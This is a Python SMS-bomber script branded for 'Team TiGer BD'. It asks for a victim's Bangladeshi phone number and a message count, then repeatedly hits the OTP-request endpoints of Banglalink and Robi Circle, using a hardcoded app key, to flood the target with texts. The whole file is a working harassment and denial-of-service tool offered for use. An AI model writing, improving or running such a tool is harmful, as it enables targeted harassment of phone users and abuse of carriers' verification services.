import os
import requests
import time
from requests.structures import CaseInsensitiveDict

#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
purple="\033[0;35m"
os.system('clear')
line=yellow+"========================================================================================================================"
space=" "
logo=green+str("""

    __  __        ____                  _     
 |  \/  |      |  _ \                | |    
 | \  / |______| |_) | ___  _ __ ___ | |__  
 | |\/| |______|  _ < / _ \| '_ ` _ \| '_ \ 
 | |  | |      | |_) | (_) | | | | | | |_) |
 |_|  |_|      |____/ \___/|_| |_| |_|_.__/ 
                                            
                                            


          
                       
   ╔═══════════════════════=══=════════╗
   	 Author   : MoJiBor RaHaMaN Sm
  	 Facebook : MoJiB Rsm       								
 	 CircLe   : BaNgLarBaG
 	 YouTube  : Mojib Entertainment  
 	    
   ╚═══════════════════==══════════════╝
       
 
  
  
""")
      
 #HEADER                
text=lightblue+"\t\t	CreaTeD By : "+yellow+"MoJiB Rsm"+cyan+"\n\n\t\t★★ "+purple+" Team TiGer BD Circle Sms BomBer"+cyan+" ★★   \n" 
notice=""     
def header():
	print(logo)
	print(text)
	print(line)
	print(notice)

#SECURITY				


#MAIN_TOOL
os.system('clear')
tt=1
header()	
while tt<2:
		os.system('clear')
		header()
		number=str(input(purple+"\n\n\t [>] Enter Your Target Number :88"+lightblue))
		ammount=int(input(lightblue+"\n\t [>] Enter The Ammount : "+lightblue))
		os.system('clear')
		notice=cyan+"\n\t\t\t   [•]  MoJiB Rsm TooLs iS running......\n\n"
		header()
		ammount2=1
		totalsent=0
		totalnotsent=0
		while ammount2<ammount+1:
			try:
				if "yy" in number or "yyy" in number:
					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
						
				else:
					url=url = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=26825&app_version=79&msisdn=88"+number
					headers=CaseInsensitiveDict()
					headers["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
					r=requests.get(url, headers=headers)
					
						
						
				if ammount2==1:
					print(purple+"\n\t\t  ★★MoJiB+Chadni★★==>   "+green+"[✓] 1st SMS Sent.")
				elif ammount2==2:
					print(purple+"\n\t\t  ★★MoJiB+ChadNi★★==>   "+green+"[✓] 2nd SMS Sent.")
				elif ammount2==3:
					print(purple+"\n\t\t  ★★MoJiB+ChadNi★★==>   "+green+"[✓] 3rd SMS Sent.")
				else:
					print(purple+"\n\t\t  ★★MoJiB+ChadNi★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
				time.sleep(0.00000000000000000000000000001)
				totalsent+=1
				ammount2+=1
			except:
				if ammount2==1:
					print(cyan+"\n\t\t  ★★MoJiB+ChadNi★★==>   "+red+"[×] 1st SMS Not Sent.")
				elif ammount2==2:
					print(cyan+"\n\t\t  ★★MoJiB+ChadNi★★==>   "+red+"[×] 2nd SMS Not Sent.")
				elif ammount2==3:
					print(cyan+"\n\t\t  ★★MoJiB+ChadNi★★==>   "+red+"[×] 3rd SMS Not Sent.")
				else:
					print(cyan+"\n\t\t  ★★MoJiB+ChadNi★★==>   "+red+"[×] "+str(ammount2)+"The SMS Not Sent.")
					time.sleep(0.000000001)
					ammount2+=1
									
								
		totalhit=ammount2-1
		totalnotsent=totalhit-totalsent
		print(purple+"\n\n\t\t[•] Total HiTs : "+red+str(totalhit))
		print(green+"\n\t\t[✓] TotaL SeNt : "+yellow+str(totalsent))
		print(red+"\n\t\t[×] TotaL NoT Sent : "+yellow+str(totalnotsent)+"\n")
		lastt=str(input(purple+"\n\n\t\t  [✓] aLL DoNe!\n\t [•] Now Press Enter Key To Continue:\n"))
		count=1
	






